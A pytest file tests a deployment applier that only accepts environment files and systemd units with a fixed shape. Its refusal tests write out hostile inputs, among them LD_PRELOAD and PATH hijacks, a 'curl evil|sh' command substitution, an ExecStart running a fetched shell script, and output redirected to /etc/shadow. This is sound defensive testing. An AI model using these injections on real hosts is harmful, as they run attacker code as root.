# SPDX-License-Identifier: AGPL-3.0-only
# Copyright 2026 PersonifAI LLC

"""an earlier change + A5: env files and units carry only their fixed shape.

`agent-env` / `harness-env` used to replace an EnvironmentFile whole, checked
only for NODE_ID — so `LD_PRELOAD=` or `PATH=` in one changed what pid 1
executes. `agent-unit` was checked only for a `[Service]` line, so its
`ExecStart=` and `User=` could name any root command. The applier now
refuses anything but the rendered keys (PATH/DOCKER_HOST pinned) and the
shipped unit's directives (ExecStart/User/groups/env file pinned).

The `env_unit_shape` block of scripts/noo-apply.sh is lifted out between its
markers and run against the REAL templates and units (the floor: what the
controller ships must pass) and against the attacks (each must be refused).
The key lists are pinned to the templates in both appliers, so a key added
to a template without its allowlist entry fails here, not on every node.
"""

from __future__ import annotations

import hashlib
import re
import subprocess
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
APPLIER = REPO / "scripts" / "noo-apply.sh"
FETCH = (REPO / "noo-cli/src/commands/node_fetch.rs").read_text()
AGENT_TMPL = REPO / "node-agent-go/deploy/noo-node-agent.env.tmpl"
HARNESS_TMPL = REPO / "node-agent-go/deploy/noo-harness.env.tmpl"
AGENT_UNIT = REPO / "node-agent-go/deploy/noo-node-agent.service"
HARNESS_UNIT = REPO / "node-agent-go/deploy/noo-harness.service"


def block() -> str:
    m = re.search(r"# BEGIN env_unit_shape\n(.*?)# END env_unit_shape", APPLIER.read_text(), re.S)
    assert m, "env_unit_shape is not delimited in noo-apply.sh"
    return m.group(1)


def render(tmpl: Path) -> str:
    """Render a template the crude way: every {{ }} becomes a plain value,
    {# #} comments and {% %} tags vanish (their bodies are kept)."""
    text = re.sub(r"\{#.*?#\}", "", tmpl.read_text(), flags=re.S)
    text = re.sub(r"\{%.*?%\}", "", text, flags=re.S)
    return re.sub(r"\{\{.*?\}\}", "value", text)


def template_keys(tmpl: Path) -> set[str]:
    return {
        m.group(1)
        for m in re.finditer(r"^([A-Z][A-Z0-9_]*)=", render(tmpl), re.M)
    }


def shell_list(name: str) -> set[str]:
    m = re.search(rf'^{name}="([^"]*)"$', block(), re.M)
    assert m, f"{name} not found in the applier"
    return set(m.group(1).split())


def rust_list(name: str) -> set[str]:
    m = re.search(rf"const {name}: &\[&str\] = &\[(.*?)\];", FETCH, re.S)
    assert m, f"node_fetch.rs: no {name}"
    return set(re.findall(r'"([^"]+)"', m.group(1)))


def run(func: str, path: Path, *args: str) -> subprocess.CompletedProcess:
    script = f"""set -eu
logger() {{ :; }}
{block()}
{func} "{path}" {' '.join(f'"{a}"' for a in args)}
"""
    return subprocess.run(["bash", "-c", script], capture_output=True, text=True)


def env_ok(tmp: Path, body: str, kind: str = "agent-env") -> subprocess.CompletedProcess:
    f = tmp / kind
    f.write_text(body)
    keys = "$AGENT_ENV_KEYS $AGENT_ENV_INERT_KEYS" if kind == "agent-env" else "$HARNESS_ENV_KEYS"
    script = f"""set -eu
logger() {{ :; }}
{block()}
env_payload_ok "{f}" {kind} "{keys}"
"""
    return subprocess.run(["bash", "-c", script], capture_output=True, text=True)


# ── the lists match the templates, in both appliers ─────────────────────────

def test_the_allowlists_are_the_template_keys():
    assert shell_list("AGENT_ENV_KEYS") == template_keys(AGENT_TMPL) - shell_list("AGENT_ENV_INERT_KEYS")
    assert shell_list("HARNESS_ENV_KEYS") == template_keys(HARNESS_TMPL)
    assert rust_list("AGENT_ENV_KEYS") == shell_list("AGENT_ENV_KEYS")
    assert rust_list("AGENT_ENV_INERT_KEYS") == shell_list("AGENT_ENV_INERT_KEYS")
    assert rust_list("HARNESS_ENV_KEYS") == shell_list("HARNESS_ENV_KEYS")


def test_the_pinned_path_is_the_rendered_one():
    rendered = re.search(r"^PATH=(.*)$", render(AGENT_TMPL), re.M).group(1)
    assert f'AGENT_ENV_PATH="{rendered}"' in block()
    assert f'const AGENT_ENV_PATH: &str = "{rendered}";' in FETCH


# ── the floor: what the controller ships passes ─────────────────────────────

def test_the_rendered_templates_pass(tmp_path: Path):
    r = env_ok(tmp_path, render(AGENT_TMPL))
    assert r.returncode == 0, r.stderr
    r = env_ok(tmp_path, render(HARNESS_TMPL), "harness-env")
    assert r.returncode == 0, r.stderr


@pytest.mark.parametrize("unit,kind", [(AGENT_UNIT, "agent-unit"), (HARNESS_UNIT, "harness-unit")])
def test_the_shipped_units_pass(unit: Path, kind: str):
    r = run("unit_payload_ok", unit, kind)
    assert r.returncode == 0, r.stderr


# ── A4: env files ───────────────────────────────────────────────────────────

@pytest.mark.parametrize("line,why", [
    ("LD_PRELOAD=/tmp/evil.so", "not a key"),
    ("NOO_SOMETHING_NEW=1", "not a key"),
    ("PATH=/tmp/evil:/usr/bin", "PATH is not the rendered value"),
    ("DOCKER_HOST=tcp://10.0.0.1:2375", "DOCKER_HOST"),
    ("LOG_LEVEL=$(curl evil|sh)", "command substitution"),
    ("LOG_LEVEL=`id`", "command substitution"),
    ("just some words", "not KEY=value"),
])
def test_an_env_payload_outside_its_shape_is_refused(tmp_path: Path, line: str, why: str):
    r = env_ok(tmp_path, render(AGENT_TMPL) + line + "\n")
    assert r.returncode == 65, (line, r.stdout, r.stderr)
    assert why in r.stderr and "REFUSED agent-env" in r.stderr


def test_a_harness_env_cannot_borrow_agent_keys(tmp_path: Path):
    r = env_ok(tmp_path, render(HARNESS_TMPL) + "DOCKER_HOST=unix:///var/run/docker.sock\n", "harness-env")
    assert r.returncode == 65, r.stderr


# ── A5: units ───────────────────────────────────────────────────────────────

def mutate(tmp: Path, unit: Path, old: str, new: str) -> Path:
    text = unit.read_text()
    assert old in text, old
    f = tmp / unit.name
    f.write_text(text.replace(old, new, 1))
    return f


@pytest.mark.parametrize("old,new", [
    ("ExecStart=/usr/local/bin/noo-node-agent", "ExecStart=/bin/sh -c 'curl evil|sh'"),
    ("User=noo-agent", "User=root"),
    ("Type=simple", "Type=simple\nExecStartPre=/bin/sh -c id"),
    ("Type=simple", "Type=simple\nAmbientCapabilities=CAP_SYS_ADMIN"),
    ("StandardOutput=journal", "StandardOutput=file:/etc/shadow"),
    ("WantedBy=multi-user.target", "WantedBy=emergency.target"),
    # The section trap: User= in [Unit] is ignored by systemd, so the
    # service would run as root.
    ("[Unit]\n", "[Unit]\nUser=noo-agent\n"),
], ids=["execstart", "user-root", "execstartpre", "capabilities", "stdout-file", "wantedby", "user-in-unit-section"])
def test_an_agent_unit_that_is_not_the_shipped_bytes_is_refused(tmp_path: Path, old: str, new: str):
    f = mutate(tmp_path, AGENT_UNIT, old, new)
    if old == "[Unit]\n":
        f.write_text(f.read_text().replace("User=noo-agent\nSupplementaryGroups", "SupplementaryGroups", 1))
    r = run("unit_payload_ok", f, "agent-unit")
    assert r.returncode == 65, (new, r.stdout, r.stderr)
    assert "is not the unit this release ships" in r.stderr


@pytest.mark.parametrize("old,new", [
    ("ExecStart=/usr/local/bin/noo-gateway harness", "ExecStart=/usr/local/bin/noo-gateway harness --evil"),
    ("User=noo-harness", "User=root"),
    ("ProtectSystem=strict", "ProtectSystem=false"),
    ("Group=noo-agent", "Group=docker"),
    ("Type=simple", "Type=simple\nSupplementaryGroups=docker"),
], ids=["execstart", "user", "protectsystem", "group", "docker"])
def test_a_harness_unit_that_is_not_the_shipped_bytes_is_refused(tmp_path: Path, old: str, new: str):
    r = run("unit_payload_ok", mutate(tmp_path, HARNESS_UNIT, old, new), "harness-unit")
    assert r.returncode == 65, (new, r.stdout, r.stderr)


def test_the_unit_sums_are_the_shipped_files():
    for name, unit in (("AGENT_UNIT_SHA256", AGENT_UNIT), ("HARNESS_UNIT_SHA256", HARNESS_UNIT)):
        m = re.search(rf'^{name}="([0-9a-f ]+)"$', block(), re.M)
        assert m, name
        want = hashlib.sha256(unit.read_bytes()).hexdigest()
        assert want in m.group(1).split(), (
            f"{unit.name} changed: put its sha256 ({want}) in {name} in scripts/noo-apply.sh"
        )


@pytest.mark.parametrize("body", ["NODE_ID=host3\rLD_PRELOAD=/x\n", "NODE_ID=host3\x00LD_PRELOAD=/x\n"], ids=["cr", "nul"])
def test_a_cr_or_nul_in_any_text_kind_is_refused(tmp_path: Path, body: str):
    f = tmp_path / "agent-env"
    f.write_bytes(body.encode())
    r = run("text_payload_ok", f, "agent-env")
    assert r.returncode == 65 and "carriage return or NUL" in r.stderr, r.stderr


def test_the_checks_run_before_anything_is_installed():
    """A refused bundle must change nothing: the shape checks sit between the
    integrity loop and the first install."""
    text = APPLIER.read_text()
    checks = text.index('env_payload_ok "$WORK/files/agent-env"')
    assert text.index('done < "$WORK/manifest"') < checks
    assert checks < text.index("# ── teardown")
    assert checks < text.index("install -d -m 750 -o root -g noo-agent")
